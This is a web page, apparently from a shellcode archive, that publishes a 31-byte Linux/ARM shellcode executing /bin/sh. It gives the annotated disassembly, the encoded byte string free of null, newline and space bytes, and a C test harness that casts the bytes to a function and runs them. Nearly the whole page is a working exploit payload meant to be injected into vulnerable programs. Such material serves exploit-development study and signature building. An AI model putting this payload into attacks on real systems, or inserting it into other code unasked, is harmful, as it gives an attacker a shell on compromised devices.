<html><head><title>Linux/ARM - execve(/bin/sh,NULL,0) - 31 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Title:  Linux/ARM - execve(&quot;/bin/sh&quot;,NULL,0) - 31 bytes
Date:   2010-08-31
Tested: ARM926EJ-S rev 5 (v5l)
Author: Jonathan Salwan - twitter: @jonathansalwan
shell-storm.org

Shellcode ARM without 0x20, 0x0a and 0x00 


00008054 &lt;_start&gt;:
    8054:	e28f3001 	add	r3, pc, #1	; 0x1
    8058:	e12fff13 	bx	r3
    805c:	4678      	mov	r0, pc
    805e:	300c      	adds	r0, #12
    8060:	46c0      	nop			(mov r8, r8)
    8062:	9001      	str	r0, [sp, #4]
    8064:	1a49      	subs	r1, r1, r1
    8066:	1a92      	subs	r2, r2, r2
    8068:	270b      	movs	r7, #11
    806a:	df01      	svc	1
    806c:	622f      	str	r7, [r5, #32]
    806e:	6e69      	ldr	r1, [r5, #100]
    8070:	732f      	strb	r7, [r5, #12]
    8072:	0068      	lsls	r0, r5, #1

*/


#include &lt;stdio.h&gt;


char *SC = 	&quot;\x01\x30\x8f\xe2&quot;
		&quot;\x13\xff\x2f\xe1&quot;
		&quot;\x78\x46\x0c\x30&quot;
		&quot;\xc0\x46\x01\x90&quot;
		&quot;\x49\x1a\x92\x1a&quot;
		&quot;\x0b\x27\x01\xdf&quot;
		&quot;\x2f\x62\x69\x6e&quot;
		&quot;\x2f\x73\x68&quot;;

int main(void)
{
        fprintf(stdout,&quot;Length: %d\n&quot;,strlen(SC));
        (*(void(*)()) SC)();
return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
